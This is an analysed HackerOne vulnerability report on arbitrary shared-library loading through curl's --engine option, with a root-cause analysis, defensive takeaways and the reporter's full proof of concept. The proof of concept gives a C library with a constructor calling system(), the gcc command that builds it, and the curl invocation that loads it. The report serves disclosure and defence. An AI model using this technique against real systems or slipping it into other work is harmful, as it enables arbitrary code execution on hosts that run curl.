# Remote Code Execution via Arbitrary Library Loading in curl --engine Option

## Metadata
- **Source:** HackerOne
- **Report:** 3293801 | https://hackerone.com/reports/3293801
- **Submitted:** 2025-08-10
- **Reporter:** z1andr4g0n
- **Program:** curl
- **Bounty:** Not specified
- **Severity:** critical
- **Vuln:** Arbitrary Code Execution, Insecure Library Loading, Path Traversal, Constructor Function Execution
- **CVEs:** None
- **Category:** memory-binary

## Summary
The curl --engine option accepts arbitrary file paths to load OpenSSL crypto engines without validation, allowing attackers to load malicious shared libraries. Attacker-controlled libraries execute constructor functions automatically via the dynamic loader before any validation occurs, achieving instant RCE on POSIX systems.

## Attack scenario
1. Attacker identifies a web application or script that constructs curl commands with user-controlled arguments
2. Attacker crafts a malicious C program with a __attribute__((constructor)) function that executes arbitrary commands
3. Attacker compiles the malicious code into a .so shared library file
4. Attacker uploads the .so file to a location readable by the target process or embeds it in version control
5. Attacker injects --engine /path/to/malicious.so into the curl command invocation via parameter manipulation
6. curl dynamically loads the library, triggering the constructor function which executes attacker commands before any engine validation

## Root cause
The --engine option in curl accepts arbitrary file paths without validation, directly passing them to dlopen() or similar dynamic library loading functions. No whitelist of legitimate engine directories exists, and no verification that the library is a valid OpenSSL engine occurs before loading. Constructor functions in shared libraries execute during the dlopen() call before any subsequent validation logic.

## Attacker mindset
An attacker recognizes that user-supplied arguments to curl represent a critical attack surface, particularly in automated systems. By exploiting the implicit trust in library loading mechanisms and leveraging ELF constructor semantics, the attacker achieves code execution that bypasses application-level security controls. The attacker understands that many developers don't consider command-line arguments as security boundaries in backend systems.

## Defensive takeaways
- Never pass untrusted user input directly as command-line arguments to external tools, especially curl
- Implement strict allowlisting for curl options and argument values rather than blacklisting
- Restrict curl to use only system-installed, signed crypto engines from well-known directories (/usr/lib/engines)
- Disable or remove the --engine option entirely if not required for the application
- Use seccomp/AppArmor/SELinux policies to restrict dynamic library loading to specific trusted directories
- Run curl in isolated containers or with minimal privileges to limit blast radius
- Audit all scripts and applications that invoke curl with externally-sourced arguments
- Consider using libcurl API directly with hardened parameter handling instead of shell invocation

## Variant hunting
Search for similar arbitrary path loading vulnerabilities in: wget --ssl-engine, custom applications using dlopen() with unsanitized paths, any tool with options accepting library/plugin paths. Check for constructor-based code execution in other contexts (Python .so imports, Node.js native modules, Ruby extensions). Examine CI/CD tools and webhook processors that construct system commands from user input.

## MITRE ATT&CK
- T1190
- T1547.013
- T1574.006
- T1059.004
- T1203

## Notes
The vulnerability is straightforward but critical due to curl's ubiquity in automated systems. The PoC is reproducible and requires no special conditions. The --engine option appears designed for developers to use custom OpenSSL engines but lacks any trust model. The vulnerability affects all POSIX systems with GCC/Clang compilation. No patch version is mentioned in the HackerOne report, suggesting disclosure may be ongoing. The impact is amplified in multi-tenant environments, CI/CD systems, and any backend that processes user-influenced curl commands.

## Full report
<details><summary>Expand</summary>

#### Summary:
The `curl` command-line tool is vulnerable to Arbitrary Code Execution on POSIX-like systems (Linux, macOS, etc.). The `--engine` option allows loading an OpenSSL crypto engine from a shared library (`.so` file). Crucially, this option accepts an **absolute or relative path** to the library file, allowing a user to load any shared library on the file system.

An attacker can craft a malicious shared library containing a `__attribute__((constructor))` function. This function is executed by the dynamic loader the moment the library is loaded into the `curl` process's memory, achieving immediate code execution, even before OpenSSL attempts to initialize it as an engine.

This leads to direct RCE if an attacker can influence the arguments passed to a `curl` command, a common scenario in web application backends, CI/CD pipelines, and other automated scripts.

*(Statement as per disclosure policy: This vulnerability was discovered and verified by me. An AI assistant was used to help structure and draft this report based on my findings and proof-of-concept.)*

#### Affected version:
I reproduced this on the following version, but it likely affects all versions that support the `--engine` option on POSIX systems with GCC/Clang compiled binaries.
```
┌──(Dr4g0n㉿DESKTOP-2CIPGDF)-[~]
└─$ curl -V
curl 8.13.0 (x86_64-pc-linux-gnu) libcurl/8.13.0 OpenSSL/3.5.0 zlib/1.3.1 brotli/1.1.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.2 libssh2/1.11.1 nghttp2/1.64.0 nghttp3/1.8.0 librtmp/2.3 OpenLDAP/2.6.9
Release-Date: 2025-04-02, security patched: 8.13.0-5
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd
```
#### Steps To Reproduce:
These steps will demonstrate direct code execution on a WSL/Linux system.

1.  **Step 1: Create the malicious payload.**
    Save the following C code as `evil_engine.c`. This code will execute `id > /tmp/RCE_VIA_ENGINE` the moment the library is loaded.

    ```c
    #include <stdlib.h>

    // This constructor function is executed automatically by the dynamic loader
    // as soon as the library is loaded into the process address space.
    __attribute__((constructor))
    static void rce_init(void) {
        system("id > /tmp/RCE_VIA_ENGINE");
    }
    ```

2.  **Step 2: Compile the payload into a shared library.**
    Use `gcc` to compile the C code into a shared object (`.so`) file.

    ```bash
    gcc -fPIC -shared -o evil_engine.so evil_engine.c
    ```

3.  **Step 3: Prepare for verification.**
    Ensure the proof file does not exist before the attack.

    ```bash
    rm -f /tmp/RCE_VIA_ENGINE
    ```

4.  **Step 4: Execute `curl` with the malicious engine.**
    Run any `curl` command, but use the `--engine` option to point to our malicious library. Note that we must provide an absolute path.

    ```bash
    curl --engine `pwd`/evil_engine.so https://example.com
    ```
    *You will see an error message like `curl: (53) SSL Engine '...' not found`. This error is expected and irrelevant, as it occurs **after** our malicious code has already been executed by the constructor.*

5.  **Step 5: Verify Code Execution.**
    Check the contents of the proof file.

    ```bash
    cat /tmp/RCE_VIA_ENGINE
    ```
    The command will output the result of the `id` command, confirming that arbitrary code was executed successfully as the user who ran `curl`.

#### Supporting Material/References:
I have recorded a full video of the Proof of Concept: `PoC.mp4`

## Impact

The security impact is **direct and critical Remote Code Execution**.

An attacker who can control or influence the arguments passed to a `curl` command can achieve RCE on the underlying system. This completely bypasses any application-level security.

Common attack scenarios include:
*   **Web Application Backends:** A web service that allows users to provide options for a `curl` command (e.g., in a "website checker" or "webhook tester" feature) would be vulnerable. An attacker could inject `--engine /path/to/payload.so` if they can also upload a file.
*   **CI/CD Pipelines & Scripts:** Automated scripts that build `curl` commands using variables from external, untrusted sources (like commit messages or API responses) could be tricked into loading a malicious engine.
*   **Social Engineering:** A developer or system administrator could be tricked into running a seemingly benign diagnostic command provided by an attacker, which includes the malicious `--engine` flag.

The vulnerability stems from the `--engine` feature trusting a user-provided path without any validation or restriction to a secure, system-defined directory for crypto engines. This effectively turns the feature into a "load-and-run" primitive for arbitrary shared libraries.

</details>

---
*Analysed by Claude on 2026-05-12*
